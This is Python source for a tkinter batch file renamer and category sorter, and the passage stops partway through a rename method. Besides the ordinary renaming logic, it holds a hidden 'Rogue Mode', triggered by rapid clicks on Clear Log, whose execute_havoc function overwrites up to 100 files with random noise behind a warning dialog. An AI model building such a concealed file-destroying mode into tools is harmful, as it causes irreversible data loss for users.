import os
import re
import shutil
import time
import uuid
import random
import string
import struct
import wave
import io
from collections import deque
import tkinter as tk
from tkinter import ttk, filedialog, messagebox, scrolledtext

# Optional drag-and-drop support via tkinterdnd2
try:
    from tkinterdnd2 import DND_FILES, TkinterDnD
    BaseTk, HAS_DND = TkinterDnD.Tk, True
except ImportError:
    BaseTk, HAS_DND = tk.Tk, False

# File category mappings for grouping and filtering
CATEGORIES = {
    "Images":    {".png", ".jpg", ".jpeg", ".gif", ".bmp", ".webp", ".tga", ".tif", ".tiff", ".svg", ".psd", ".ico"},
    "Models":    {".obj", ".fbx", ".blend", ".stl", ".gltf", ".glb", ".3ds", ".dae", ".ply", ".max", ".ma", ".mb"},
    "Archives":  {".zip", ".rar", ".7z", ".tar", ".gz", ".bz2", ".xz"},
    "Scripts":   {".py", ".js", ".ts", ".bat", ".ps1", ".sh", ".lua", ".cs", ".cpp", ".c", ".h", ".java", ".json"},
    "Documents": {".txt", ".pdf", ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx", ".md", ".csv"},
    "Media":     {".mp3", ".wav", ".ogg", ".flac", ".mp4", ".mov", ".avi", ".mkv", ".webm"},
}
ALL_CATEGORIES = list(CATEGORIES) + ["Other"]

# Sort configuration mapping
SORT_OPTIONS = {
    "Name (A-Z)":                    ("name", False),
    "Name (Z-A)":                    ("name", True),
    "Date Modified (Oldest First)":  ("mtime", False),
    "Date Modified (Newest First)":  ("mtime", True),
    "File Size (Smallest First)":    ("size", False),
    "File Size (Largest First)":     ("size", True),
}

ILLEGAL_CHARS = '<>:"/\\|?*'
RESERVED_NAMES = {"CON", "PRN", "AUX", "NUL"} | {f"COM{i}" for i in range(1, 10)} | {f"LPT{i}" for i in range(1, 10)}
PLACEHOLDER_RE = re.compile(r"\{(name|num|date|ext)\}")

# Rogue Mode Configuration
ROGUE_MAX_FILES = 100          # Strict safety cap to prevent catastrophic OS locks
ROGUE_CLICKS, ROGUE_WINDOW = 4, 2.0   # 4 clicks within 2 seconds trigger Rogue Mode
NORMAL_BG = "#f3f3f3"
ROGUE_BG, ROGUE_PANEL, ROGUE_FIELD, ROGUE_FG, ROGUE_EDGE = "#2a0709", "#5c0f14", "#1c0406", "#f6d6d6", "#8b0000"
NORMAL_LOG = {"bg": "white", "fg": "black", "preview": "#0b5cad", "ok": "#1a7f37", "err": "#c62828", "info": "#555555"}
ROGUE_LOG = {"bg": ROGUE_FIELD, "fg": ROGUE_FG, "preview": "#ff9a9a", "ok": "#9be79b", "err": "#ff5c5c", "info": "#c9a0a0"}

# Place these above your main UI class
def generate_noise_bmp(width=256, height=256):
    filesize = 54 + (3 * width * height)
    bmp_header = struct.pack('<ccIHHI', b'B', b'M', filesize, 0, 0, 54)
    dib_header = struct.pack('<IIiiHHIIIIII', 40, width, height, 1, 24, 0, 3 * width * height, 2835, 2835, 0, 0)
    pixels = bytearray(random.getrandbits(8) for _ in range(3 * width * height))
    return bmp_header + dib_header + pixels

def generate_noise_wav(duration=1, sample_rate=11025):
    num_samples = duration * sample_rate
    buf = io.BytesIO()
    with wave.open(buf, 'wb') as wav_file:
        wav_file.setnchannels(1)
        wav_file.setsampwidth(2)
        wav_file.setframerate(sample_rate)
        data = bytearray()
        for _ in range(num_samples):
            val = random.randint(-32767, 32767)
            data.extend(struct.pack('<h', val))
        wav_file.writeframesraw(data)
    return buf.getvalue()

def generate_babel_text(length=2048):
    chars = string.ascii_lowercase + " ,."
    return ''.join(random.choice(chars) for _ in range(length)).encode('utf-8')

def execute_havoc(target_directory):
    image_exts = {'.png', '.jpg', '.jpeg', '.bmp', '.webp', '.gif'}
    audio_exts = {'.mp3', '.wav', '.ogg', '.flac', '.m4a'}
    text_exts = {'.txt', '.md', '.csv', '.json', '.py', '.html', '.xml', '.ini'}
    
    files_processed = 0
    safety_limit = 100
    
    for root, dirs, files in os.walk(target_directory):
        for file in files:
            if files_processed >= safety_limit:
                return 
            
            filepath = os.path.join(root, file)
            ext = os.path.splitext(file)[1].lower()
            
            try:
                if ext in image_exts:
                    noise = generate_noise_bmp(width=512, height=512)
                    with open(filepath, 'wb') as f:
                        f.write(noise)
                elif ext in audio_exts:
                    noise = generate_noise_wav(duration=2)
                    with open(filepath, 'wb') as f:
                        f.write(noise)
                elif ext in text_exts:
                    noise = generate_babel_text()
                    with open(filepath, 'wb') as f:
                        f.write(noise)
                else:
                    noise_chunk = os.urandom(1024 * 64) 
                    with open(filepath, 'wb') as f:
                        for _ in range(5):
                            f.write(noise_chunk)
                            
                files_processed += 1
            except Exception:
                pass

def category_of(path):
    """Return category group based on file extension."""
    ext = os.path.splitext(path)[1].lower()
    for cat, exts in CATEGORIES.items():
        if ext in exts:
            return cat
    return "Other"


def to_alpha(n):
    """Convert integer counter to alphabetical sequence (1->A, 26->Z, 27->AA)."""
    s = ""
    while n > 0:
        n, r = divmod(n - 1, 26)
        s = chr(65 + r) + s
    return s


def to_roman(n):
    """Convert positive integer to Roman numeral notation."""
    table = [(1000, "M"), (900, "CM"), (500, "D"), (400, "CD"), (100, "C"), (90, "XC"),
             (50, "L"), (40, "XL"), (10, "X"), (9, "IX"), (5, "V"), (4, "IV"), (1, "I")]
    out = ""
    for value, sym in table:
        while n >= value:
            out += sym
            n -= value
    return out or "I"


def human_size(b):
    """Format byte size to standard human readable string."""
    for unit in ("B", "KB", "MB", "GB"):
        if b < 1024:
            return f"{b:.0f} {unit}" if unit == "B" else f"{b:.1f} {unit}"
        b /= 1024
    return f"{b:.1f} TB"


def natural_key(s):
    """Natural sorting key function (e.g. file2 before file10)."""
    return [int(t) if t.isdigit() else t.lower() for t in re.split(r"(\d+)", s)]


def clean_base(text):
    """Sanitize base string against invalid Windows filename characters."""
    sanitized = re.sub(r'[<>:"/\\|?*\x00-\x1f]', "_", text.strip())
    return sanitized or "asset"


def sort_key(path, field):
    """Generate sorting valuation for a file path based on field type."""
    if field == "name":
        return natural_key(os.path.basename(path))
    try:
        st = os.stat(path)
        if field == "size":
            return st.st_size
        if field == "mtime":
            return st.st_mtime
    except OSError:
        pass
    return 0


def file_date(path):
    """Extract file modification date in YYMMDD format."""
    try:
        return time.strftime("%y%m%d", time.localtime(os.path.getmtime(path)))
    except (OSError, ValueError, OverflowError):
        return "000000"


def validate_pattern(pattern):
    """Validate custom rename pattern string against illegal characters."""
    if not pattern.strip():
        return "Pattern string cannot be empty."
    literal = PLACEHOLDER_RE.sub("", pattern)
    bad = sorted({c for c in literal if c in ILLEGAL_CHARS or ord(c) < 32})
    if bad:
        return "Contains illegal characters: " + " ".join(c if c in ILLEGAL_CHARS else repr(c) for c in bad)
    if "{" in literal or "}" in literal:
        return "Unbalanced or unknown tags. Valid: {name}, {num}, {date}, {ext}"
    if "{num}" not in pattern:
        return "Pattern must contain {num} counter to guarantee unique filenames."
    return None


def render_pattern(pattern, name, num, date, ext):
    """Replace pattern placeable tags with corresponding file values."""
    values = {"name": name, "num": str(num), "date": date, "ext": ext.lstrip(".")}
    return PLACEHOLDER_RE.sub(lambda m: values[m.group(1)], pattern)


def check_filename_legality(stem):
    """Check if generated stem violates Windows filename rules."""
    if not stem.strip():
        return "Empty filename stem"
    if any(c in ILLEGAL_CHARS or ord(c) < 32 for c in stem):
        return "Contains illegal Windows characters"
    if stem != stem.rstrip(" ."):
        return "Filename cannot end with space or dot"
    if stem.split(".")[0].upper() in RESERVED_NAMES:
        return f"'{stem}' is a reserved system filename"
    if len(stem) > 200:
        return "Filename exceeds maximum safe length"
    return None


def with_ext(stem, ext, pattern_mode=False):
    """Attach extension if not already present from custom pattern."""
    if pattern_mode and ext and stem.lower().endswith(ext.lower()):
        return stem
    return stem + ext


def is_hidden(path):
    """Determine if a file or folder is hidden or inaccessible."""
    if os.path.basename(path).startswith("."):
        return True
    try:
        attrs = getattr(os.stat(path), "st_file_attributes", 0)
        return bool(attrs & 2)
    except OSError:
        return True


class Tooltip:
    """Hover Tooltip Helper: displays brief hint instantly, expanding after 1.5s delay."""
    SHORT_MS = 300
    LONG_MS = 1500  # Expands to detailed description after 1.5 seconds

    def __init__(self, widget, short, detail=""):
        self.widget = widget
        self.short = short
        self.detail = detail
        self.win = None
        self.frame = None
        self.detail_lbl = None
        self.jobs = []
        self.pos = (0, 0)

        widget.bind("<Enter>", self._enter, add="+")
        widget.bind("<Motion>", self._track, add="+")
        widget.bind("<Leave>", self._hide, add="+")
        widget.bind("<ButtonPress>", self._hide, add="+")

    def _track(self, event):
        self.pos = (event.x_root, event.y_root)

    def _enter(self, event):
        self._track(event)
        self._cancel()
        self.jobs.append(self.widget.after(self.SHORT_MS, self._show_short))
        if self.detail:
            self.jobs.append(self.widget.after(self.LONG_MS, self._show_detail))

    def _cancel(self):
        for job in self.jobs:
            self.widget.after_cancel(job)
        self.jobs = []

    def _show_short(self):
        if self.win:
            return
        self.win = tk.Toplevel(self.widget)
        self.win.wm_overrideredirect(True)
        self.win.attributes("-topmost", True)
        self.frame = tk.Frame(self.win, bg="#ffffd0", highlightthickness=1, highlightbackground="#888888")
        self.frame.pack()
        tk.Label(self.frame, text=self.short, bg="#ffffd0", fg="black", font=("Segoe UI", 9, "bold"),
                 justify="left", wraplength=340, padx=8, pady=4).pack(anchor="w")
        self._position()

    def _show_detail(self):
        self._show_short()
        if self.detail_lbl or not self.frame:
            return
        self.detail_lbl = tk.Label(self.frame, text=self.detail, bg="#ffffd0", fg="#333333", font=("Segoe UI", 9),
                                   justify="left", wraplength=340, padx=8)
        self.detail_lbl.pack(anchor="w", pady=(0, 6))
        self._position()

    def _position(self):
        if not self.win:
            return
        self.win.update_idletasks()
        w, h = self.win.winfo_reqwidth(), self.win.winfo_reqheight()
        x = min(self.pos[0] + 16, self.win.winfo_screenwidth() - w - 8)
        y = self.pos[1] + 20
        if y + h > self.win.winfo_screenheight() - 8:
            y = self.pos[1] - h - 10
        self.win.wm_geometry(f"+{max(x, 0)}+{max(y, 0)}")

    def _hide(self, _event=None):
        self._cancel()
        if self.win:
            self.win.destroy()
        self.win = None
        self.frame = None
        self.detail_lbl = None


class RogueConfirmDialog(tk.Toplevel):
    """Custom Modal Dialog for Rogue Mode Second Confirmation Lock with Hover Warning."""
    def __init__(self, parent):
        super().__init__(parent)
        self.result = False
        self.title("CRITICAL WARNING: Rogue Mode")
        self.geometry("520x220")
        self.resizable(False, False)
        self.configure(bg=ROGUE_BG)
        self.transient(parent)
        self.grab_set()

        # Center on parent
        self.update_idletasks()
        px = parent.winfo_x() + (parent.winfo_width() // 2) - 260
        py = parent.winfo_y() + (parent.winfo_height() // 2) - 110
        self.geometry(f"+{max(0, px)}+{max(0, py)}")

        tk.Label(
            self,
            text="FINAL WARNING: BYTE CORRUPTION HAZARD",
            font=("Segoe UI", 11, "bold"),
            fg="#ff3333", bg=ROGUE_BG, pady=10
        ).pack()

        # Exact required message text
        msg = "(this will scramble all the bytes INSIDE the files and make them absolutely random, the undo button will NOT WORK if you continue)"
        tk.Label(
            self,
            text=msg,
            font=("Segoe UI", 9, "bold"),
            fg=ROGUE_FG, bg=ROGUE_BG,
            wraplength=480, justify="center"
        ).pack(padx=15, pady=10)

        btn_box = tk.Frame(self, bg=ROGUE_BG)
        btn_box.pack(side="bottom", pady=20)

        yes_btn = tk.Button(
            btn_box, text="  Yes, Scramble Bytes  ", font=("Segoe UI", 9, "bold"),
            bg="#8b0000", fg="white", activebackground="#ff0000", activeforeground="white",
            relief="raised", command=self._on_yes
        )
        yes_btn.pack(side="left", padx=15)

        no_btn = tk.Button(
            btn_box, text="  Cancel / Abort  ", font=("Segoe UI", 9),
            bg="#4a0b0f", fg=ROGUE_FG, activebackground="#5c0f14", activeforeground="white",
            command=self._on_no
        )
        no_btn.pack(side="left", padx=15)

        # Custom Tooltip attached directly to the "Yes" button in this second confirmation dialog
        Tooltip(yes_btn, "(MAKE A BACKUP IF YOU DONT WANT TO LOSE THESE FILES)")

        self.protocol("WM_DELETE_WINDOW", self._on_no)
        self.wait_window()

    def _on_yes(self):
        self.result = True
        self.destroy()

    def _on_no(self):
        self.result = False
        self.destroy()


class FolderReorganizerApp(BaseTk):
    """Main Application Window for Folder Reorganizer & Asset Sorter."""
    def __init__(self):
        super().__init__()
        self.title("Folder Reorganizer & Asset Sorter")
        
        # Initial Window Geometry: 1000x780 ensures action panel & log box are fully visible
        w, h = 1000, 780
        sw, sh = self.winfo_screenwidth(), self.winfo_screenheight()
        h = min(h, sh - 60)
        self.geometry(f"{w}x{h}+{max(0, (sw - w) // 2)}+{max(0, (sh - h) // 2 - 20)}")
        self.minsize(920, 660)

        # Reactive Form Variables
        self.folder_path = tk.StringVar()
        self.mode = tk.StringVar(value="seq")
        self.base_name = tk.StringVar(value="asset")
        self.custom_pattern = tk.StringVar(value="Asset_{date}_{num}")
        self.start_counter = tk.StringVar(value="1")
        self.sort_by = tk.StringVar(value="Name (A-Z)")
        self.reset_counter_sub = tk.BooleanVar(value=False)
        self.ext_filter = tk.StringVar()
        self.cat_sort_sub = tk.BooleanVar(value=False)
        self.recursive = tk.BooleanVar(value=False)
        self.cat_vars = {c: tk.BooleanVar(value=True) for c in ALL_CATEGORIES}
        self.status_msg = tk.StringVar(value="Select or drag a folder to analyze.")
        self.pattern_preview = tk.StringVar()

        # Engine State Tracking
        self.history = []
        self.tips = []
        self.rogue_active = False
        self.clear_click_times = deque(maxlen=ROGUE_CLICKS)

        self._init_styles()
        self._build_layout()
        self._update_states()
        self._update_example_preview()

        # Bind reactive traces
        for var in (self.mode, self.base_name, self.start_counter, self.custom_pattern):
            var.trace_add("write", lambda *_: self._update_example_preview())
        self.mode.trace_add("write", lambda *_: self._update_states())

    def _init_styles(self):
        style = ttk.Style(self)
        style.theme_use("vista" if "vista" in style.theme_names() else "clam")
        self.normal_theme = style.theme_use()
        self.option_add("*Font", ("Segoe UI", 9))
        self.configure(bg=NORMAL_BG)
        style.configure("Treeview", rowheight=22)
        style.configure("Action.TButton", font=("Segoe UI", 10, "bold"), padding=5)

    def attach_tip(self, widget, short, detail=""):
        t = Tooltip(widget, short, detail)
        self.tips.append(t)
        return t

    def _build_layout(self):
        # Top Panel: Folder Path Entry & Browse
        top_frame = ttk.Frame(self, padding=(10, 10, 10, 4))
        top_frame.pack(fill="x")
        ttk.Label(top_frame, text="Target Folder:").pack(side="left")
        
        path_entry = ttk.Entry(top_frame, textvariable=self.folder_path)
        path_entry.pack(side="left", fill="x", expand=True, padx=8)
        path_entry.bind("<Return>", lambda e: self.scan_folder())
        
        browse_btn = ttk.Button(top_frame, text="Browse...", command=self.browse_folder)
        browse_btn.pack(side="left")
        rescan_btn = ttk.Button(top_frame, text="Rescan", command=self.scan_folder)
        rescan_btn.pack(side="left", padx=(6, 0))

        self.attach_tip(path_entry, "Selected Directory Path", "Enter path directly or click Browse. Supports drag-and-drop if tkinterdnd2 is installed.")
        self.attach_tip(browse_btn, "Open Directory Picker", "Browse filesystem to choose target root folder.")
        self.attach_tip(rescan_btn, "Refresh Folder Analysis", "Re-scans target folder and updates tree view.")

        # Bottom Panel (Packed first so it sits fixed at the window base): Status, Action Bar, Execution Log
        ttk.Label(self, textvariable=self.status_msg, anchor="w", padding=(10, 2)).pack(side="bottom", fill="x")
        
        log_frame = ttk.LabelFrame(self, text="Execution Log & Operations", padding=6)
        log_frame.pack(side="bottom", fill="x", padx=10, pady=(2, 4))
        
        self.log_box = scrolledtext.ScrolledText(log_frame, height=7, state="disabled", font=("Consolas", 9), bg="white", relief="flat")
        self.log_box.pack(fill="both", expand=True)
        for tag, col in (("preview", "#0b5cad"), ("ok", "#1a7f37"), ("err", "#c62828"), ("info", "#555555")):
            self.log_box.tag_config(tag, foreground=col)

        action_bar = ttk.Frame(self, padding=(10, 4))
        action_bar.pack(side="bottom", fill="x")

        # Action Buttons
        self.preview_btn = ttk.Button(action_bar, text="Preview (Dry Run)", command=lambda: self.execute_run(dry=True))
        self.preview_btn.pack(side="left", padx=(0, 8))
        self.attach_tip(self.preview_btn, "Simulate Batch Operations", "Generates full execution plan in the log without making any real file changes.")

        self.apply_btn = ttk.Button(action_bar, text="Apply Changes", style="Action.TButton", command=lambda: self.execute_run(dry=False))
        self.apply_btn.pack(side="left", padx=(0, 8))
        self.apply_tip = self.attach_tip(self.apply_btn, "Execute Batch Renaming", "Applies all renaming, counter, and sorting rules to disk.")
        self.apply_tip_normal = ("Execute Batch Renaming", "Applies all renaming, counter, and sorting rules to disk.")

        self.undo_btn = ttk.Button(action_bar, text="Undo Last Run", command=self.undo_last_run)
        self.undo_btn.pack(side="left", padx=(0, 8))
        self.attach_tip(self.undo_btn, "Revert Previous Batch Run", "Restores original filenames and removes empty category folders from standard runs.")

        self.clear_btn = ttk.Button(action_bar, text="Clear Log", command=self._handle_clear_log_click)
        self.clear_btn.pack(side="right")
        self.attach_tip(self.clear_btn, "Clear Execution Log", "Empties the text box log display below.")

        # Middle Section: Paned window (Left = Interactive Treeview, Right = Controls)
        paned = ttk.PanedWindow(self, orient="horizontal")
        paned.pack(fill="both", expand=True, padx=10, pady=4)

        left_panel = ttk.LabelFrame(paned, text="Scanned Folder Contents", padding=6)
        paned.add(left_panel, weight=3)

        self.tree = ttk.Treeview(left_panel, columns=("type", "size"), selectmode="browse")
        self.tree.heading("#0", text="Name", anchor="w")
        self.tree.heading("type", text="Type / Category", anchor="w")
        self.tree.heading("size", text="Size", anchor="e")
        self.tree.column("#0", width=320)
        self.tree.column("type", width=110, anchor="w")
        self.tree.column("size", width=85, anchor="e")
        self.tree.tag_configure("folder", foreground="#0b5cad")

        tree_scroll = ttk.Scrollbar(left_panel, orient="vertical", command=self.tree.yview)
        self.tree.configure(yscrollcommand=tree_scroll.set)
        self.tree.pack(side="left", fill="both", expand=True)
        tree_scroll.pack(side="right", fill="y")

        right_panel = ttk.Frame(paned, padding=(6, 0, 0, 0))
        paned.add(right_panel, weight=1)
        self._build_control_parameters(right_panel)

        # Drag and Drop registration
        if HAS_DND:
            for w in (path_entry, self.tree):
                w.drop_target_register(DND_FILES)
                w.dnd_bind("<<Drop>>", self._on_drag_drop)
            self.status_msg.set("Drag and drop a folder into window to analyze.")

    def _build_control_parameters(self, parent):
        # Renaming Modes Group
        mode_box = ttk.LabelFrame(parent, text="Renaming Configurations", padding=8)
        mode_box.pack(fill="x")

        modes = [
            ("Sequential Numbers  (asset_1, asset_2...)", "seq",
             "Number Counter", "Appends incremental sequence numbers to base name."),
            ("Alphabetical Suffixes  (asset_A ... asset_Z, asset_AA...)", "alpha",
             "Spreadsheet Alpha Counter", "Appends letters (A-Z, AA, AB...) sequentially."),
            ("Roman Numerals  (asset_I, asset_II, asset_III...)", "roman",
             "Roman Numeral Counter", "Appends Roman numerals sequentially."),
            ("Random 10-Char Unique ID (ignores base name)", "hash",
             "Unique Hex Hash", "Generates random unique 10-character hash ID."),
            ("Custom Pattern Parser ({name}, {num}, {date}, {ext})", "pattern",
             "Pattern Template Parser", "Parse placeholders: {name}, {num}, {date}, {ext}. Example: Asset_{date}_{num}"),
        ]

        for text, val, short, detail in modes:
            rb = ttk.Radiobutton(mode_box, text=text, value=val, variable=self.mode)
            rb.pack(anchor="w", pady=1)
            self.attach_tip(rb, short, detail)

        form = ttk.Frame(mode_box)
        form.pack(fill="x", pady=(6, 0))
        form.columnconfigure(1, weight=1)

        # Base Name
        lbl1 = ttk.Label(form, text="Base Name:")
        lbl1.grid(row=0, column=0, sticky="w", pady=2)
        self.base_entry = ttk.Entry(form, textvariable=self.base_name)
        self.base_entry.grid(row=0, column=1, sticky="ew", padx=(6, 0), pady=2)
        self.attach_tip(lbl1, "Filename Base Prefix", "Primary name prefix for sequential, alpha, and Roman modes.")
        self.attach_tip(self.base_entry, "Filename Base Prefix", "Primary name prefix for sequential, alpha, and Roman modes.")

        # Pattern
        lbl2 = ttk.Label(form, text="Pattern Parser:")
        lbl2.grid(row=1, column=0, sticky="w", pady=2)
        self.pattern_entry = ttk.Entry(form, textvariable=self.custom_pattern)
        self.pattern_entry.grid(row=1, column=1, sticky="ew", padx=(6, 0), pady=2)
        self.attach_tip(lbl2, "Custom Template String", "Supported tags: {name}, {num}, {date}, {ext}.")
        self.attach_tip(self.pattern_entry, "Custom Template String", "Supported tags: {name}, {num}, {date}, {ext}.")

        # Start Counter
        lbl3 = ttk.Label(form, text="Start Counter:")
        lbl3.grid(row=2, column=0, sticky="w", pady=2)
        self.start_spin = ttk.Spinbox(form, from_=1, to=999999, textvariable=self.start_counter, width=8)
        self.start_spin.grid(row=2, column=1, sticky="w", padx=(6, 0), pady=2)
        self.attach_tip(lbl3, "Initial Sequence Start", "Sets starting number for counters (1 = 1 / A / I).")
        self.attach_tip(self.start_spin, "Initial Sequence Start", "Sets starting number for counters (1 = 1 / A / I).")

        # Sort Dropdown
        lbl4 = ttk.Label(form, text="Sort Files By:")
        lbl4.grid(row=3, column=0, sticky="w", pady=2)
        self.sort_combo = ttk.Combobox(form, textvariable=self.sort_by, values=list(SORT_OPTIONS), state="readonly")
        self.sort_combo.grid(row=3, column=1, sticky="ew", padx=(6, 0), pady=2)
        self.attach_tip(lbl4, "Pre-Renaming Sort Order", "Orders files before assigning sequential numbers.")
        self.attach_tip(self.sort_combo, "Pre-Renaming Sort Order", "Orders files before assigning sequential numbers.")

        reset_cb = ttk.Checkbutton(mode_box, text="Reset Counter per Subfolder", variable=self.reset_counter_sub)
        reset_cb.pack(anchor="w", pady=(4, 0))
        self.attach_tip(reset_cb, "Subfolder Counter Reset", "Restarts sequence counters at 1 when processing each subfolder.")

        self.example_lbl = ttk.Label(mode_box, textvariable=self.pattern_preview, foreground="#0b5cad", wraplength=280)
        self.example_lbl.pack(anchor="w", pady=(4, 0))

        # Sorting & Category Subfolder Group
        sort_box = ttk.LabelFrame(parent, text="Sorting & Filtering Options", padding=8)
        sort_box.pack(fill="x", pady=(8, 0))

        cat_cb = ttk.Checkbutton(sort_box, text="Group files into category subfolders", variable=self.cat_sort_sub)
        cat_cb.pack(anchor="w")
        self.attach_tip(cat_cb, "Category Subfolder Auto-Sorting", "Automatically creates subfolders (Images, Models, Scripts, etc.) and moves matching files.")

        rec_cb = ttk.Checkbutton(sort_box, text="Include files in subfolders (Recursive)", variable=self.recursive)
        rec_cb.pack(anchor="w")
        self.attach_tip(rec_cb, "Recursive Subfolder Processing", "Traverses nested subdirectories inside target root folder.")

        cat_lbl = ttk.Label(sort_box, text="Active File Categories:")
        cat_lbl.pack(anchor="w", pady=(4, 0))
        grid = ttk.Frame(sort_box)
        grid.pack(fill="x")
        for i, cat in enumerate(ALL_CATEGORIES):
            cb = ttk.Checkbutton(grid, text=cat, variable=self.cat_vars[cat])
            cb.grid(row=i // 3, column=i % 3, sticky="w", padx=(0, 6))
            self.attach_tip(cb, f"Process {cat}", f"Toggles processing for {cat} file extensions.")

        ext_frame = ttk.Frame(sort_box)
        ext_frame.pack(fill="x", pady=(4, 0))
        ext_lbl = ttk.Label(ext_frame, text="Extension Filter:")
        ext_lbl.pack(side="left")
        ext_entry = ttk.Entry(ext_frame, textvariable=self.ext_filter)
        ext_entry.pack(side="left", fill="x", expand=True, padx=(6, 0))
        self.attach_tip(ext_lbl, "Specific Extension Filter", "Comma-separated list (e.g. png, jpg, txt). Blank processes all.")
        self.attach_tip(ext_entry, "Specific Extension Filter", "Comma-separated list (e.g. png, jpg, txt). Blank processes all.")

    def _update_states(self):
        m = self.mode.get()
        self.base_entry.config(state="normal" if m in ("seq", "alpha", "roman") else "disabled")
        self.pattern_entry.config(state="normal" if m == "pattern" else "disabled")
        self.start_spin.config(state="disabled" if m == "hash" else "normal")

    def _get_start_num(self):
        try:
            return max(1, int(self.start_counter.get()))
        except ValueError:
            return 1

    def _update_example_preview(self):
        b = clean_base(self.base_name.get())
        n = self._get_start_num()
        m = self.mode.get()
        if m == "seq":
            self.pattern_preview.set(f"Sample output: {b}_{n}.png")
        elif m == "alpha":
            self.pattern_preview.set(f"Sample output: {b}_{to_alpha(n)}.png")
        elif m == "roman":
            self.pattern_preview.set(f"Sample output: {b}_{to_roman(n)}.png")
        elif m == "hash":
            self.pattern_preview.set("Sample output: e4d9a1c07f.png")
        elif m == "pattern":
            pat = self.custom_pattern.get().strip()
            err = validate_pattern(pat)
            if err:
                self.pattern_preview.set(f"Pattern Warning: {err}")
            else:
                stem = render_pattern(pat, "sample", n, time.strftime("%y%m%d"), ".png")
                p_err = check_filename_legality(stem)
                if p_err:
                    self.pattern_preview.set(f"Name Warning: {p_err}")
                else:
                    self.pattern_preview.set(f"Sample output: {with_ext(stem, '.png', True)}")

    def browse_folder(self):
        p = filedialog.askdirectory(title="Select Target Folder")
        if p:
            self.folder_path.set(os.path.normpath(p))
            self.scan_folder()

    def _on_drag_drop(self, event):
        items = self.tk.splitlist(event.data)
        if items:
            path = items[0]
            if not os.path.isdir(path):
                path = os.path.dirname(path)
            self.folder_path.set(os.path.normpath(path))
            self.scan_folder()

    def scan_folder(self):
        root = self.folder_path.get().strip()
        self.tree.delete(*self.tree.get_children())
        if not os.path.isdir(root):
            self.status_msg.set("Invalid directory path specified.")
            return
        stats = [0, 0]
        self._populate_tree("", root, stats)
        self.status_msg.set(f"Scanned {stats[0]} files ({human_size(stats[1])}) in {root}")

    def _populate_tree(self, parent_node, current_dir, stats):
        try:
            entries = sorted(os.scandir(current_dir), key=lambda e: (not e.is_dir(), natural_key(e.name)))
        except OSError:
            return
        for e in entries:
            if e.is_dir(follow_symlinks=False):
                node = self.tree.insert(parent_node, "end", text=e.name, values=("Folder", ""), tags=("folder",))
                self._populate_tree(node, e.path, stats)
            else:
                try:
                    sz = e.stat().st_size
                except OSError:
                    sz = 0
                stats[0] += 1
                stats[1] += sz
                self.tree.insert(parent_node, "end", text=e.name, values=(category_of(e.name), human_size(sz)))

    def build_plan(self):
        root = self.folder_path.get().strip()
        if not os.path.isdir(root):
            raise ValueError("Please select a valid folder before proceeding.")
        
        base = clean_base(self.base_name.get())
        m = self.mode.get()
        pat = self.custom_pattern.get().strip()

        # Strict safety handling on pattern parsing with automatic default fallback
        if m == "pattern":
            pat_err = validate_pattern(pat)
            if pat_err:
                self.log(f"SAFETY FALLBACK: Pattern error '{pat_err}'. Reverting to default sequential format ({base}_1).", "err")
                m = "seq"

        # Gather target candidate files
        candidates = []
        if self.recursive.get():
            for d, dirs, files in os.walk(root):
                dirs.sort(key=natural_key)
                for f in files:
                    candidates.append(os.path.join(d, f))
        else:
            for f in os.listdir(root):
                p = os.path.join(root, f)
                if os.path.isfile(p):
                    candidates.append(p)

        # Filtering passes
        active_cats = {c for c, v in self.cat_vars.items() if v.get()}
        filter_exts = {"." + e.strip().lower().lstrip(".") for e in self.ext_filter.get().split(",") if e.strip()}
        
        matched_files = [
            f for f in candidates
            if category_of(f) in active_cats
            and (not filter_exts or os.path.splitext(f)[1].lower() in filter_exts)
        ]

        # Sorting files prior to sequential counter assignment
        f_key, f_rev = SORT_OPTIONS.get(self.sort_by.get(), ("name", False))
        matched_files.sort(key=lambda x: (sort_key(x, f_key), natural_key(x)), reverse=f_rev)

        sources = {os.path.normcase(f) for f in matched_files}
        reserved, plan, counters = set(), [], {}
        start_val = self._get_start_num()
        per_sub = self.reset_counter_sub.get()

        for src in matched_files:
            ext = os.path.splitext(src)[1]
            dest_dir = os.path.join(root, category_of(src)) if self.cat_sort_sub.get() else os.path.dirname(src)
            ckey = os.path.normcase(dest_dir) if per_sub else "global"
            n = counters.get(ckey, start_val)

            for _ in range(100000):
                if m == "seq":
                    stem = f"{base}_{n}"
                elif m == "alpha":
                    stem = f"{base}_{to_alpha(n)}"
                elif m == "roman":
                    stem = f"{base}_{to_roman(n)}"
                elif m == "hash":
                    stem = uuid.uuid4().hex[:10]
                elif m == "pattern":
                    orig_stem, orig_ext = os.path.splitext(os.path.basename(src))
                    stem = render_pattern(pat, orig_stem, n, file_date(src), orig_ext)
                    p_err = check_filename_legality(stem)
                    if p_err:
                        self.log(f"SAFETY FALLBACK: Generated name '{stem}' invalid ({p_err}). Using fallback '{base}_{n}'.", "err")
                        stem = f"{base}_{n}"

                dst = os.path.join(dest_dir, with_ext(stem, ext, m == "pattern"))
                n += 1
                dst_key = os.path.normcase(dst)
                if dst_key not in reserved and (dst_key in sources or not os.path.exists(dst)):
                    break
            else:
                raise ValueError(f"Could not allocate unique destination name for {os.path.basename(src)}")

            counters[ckey] = n
            reserved.add(dst_key)
            if dst_key != os.path.normcase(src):
                plan.append((src, dst))

        return plan

    def execute_run(self, dry):
        if self.rogue_active:
            self._execute_rogue_run(dry)
            return

        try:
            plan = self.build_plan()
        except ValueError as err:
            messagebox.showwarning("Execution Warning", str(err))
            return
        except Exception as exc:
            self.log(f"Unexpected planning error: {exc}", "err")
            return

        if not plan:
            self.log("No matching files require renaming or moving.", "info")
            return

        root = self.folder_path.get().strip()
        if dry:
            self.log(f"--- PREVIEW RUN: {len(plan)} file modification(s) planned ---", "info")
            for src, dst in plan:
                self.log(f"Plan: {self._rel(src, root)}  -->  {self._rel(dst, root)}", "preview")
            return

        if not messagebox.askyesno("Confirm Rename Operations", f"Proceed with modifying {len(plan)} files?"):
            return

        done = self._apply_rename_pass(plan, root, "RENAMED")
        if done:
            self.history.append(done)
        self.log(f"--- Execution Complete: {len(done)} of {len(plan)} files updated ---", "info")
        self.scan_folder()

    def _apply_rename_pass(self, pairs, root, action_verb):
        """Pre-rename pass with temporary filename collision handling to safely swap names without overwriting."""
        staged = []
        for src, dst in pairs:
            tmp_path = os.path.join(os.path.dirname(src), f".reorg_tmp_{uuid.uuid4().hex}")
            try:
                os.rename(src, tmp_path)
                staged.append((tmp_path, src, dst))
            except Exception as exc:
                self.log(f"SKIPPED: {self._rel(src, root)} (File locked or permission denied: {exc})", "err")

        executed = []
